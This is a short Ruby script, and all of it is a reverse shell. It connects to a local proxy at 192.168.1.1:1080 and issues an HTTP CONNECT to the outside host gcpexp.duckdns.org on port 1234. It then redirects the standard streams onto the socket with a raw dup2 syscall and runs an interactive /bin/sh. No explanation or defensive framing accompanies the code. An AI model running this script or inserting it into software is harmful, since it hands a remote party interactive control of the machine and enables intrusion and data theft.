
require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 1080, '192.168.1.1'
s.print "CONNECT gcpexp.duckdns.org:1234 HTTP/1.0\r\nHost: 192.168.1.1\r\n\r\n"
[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
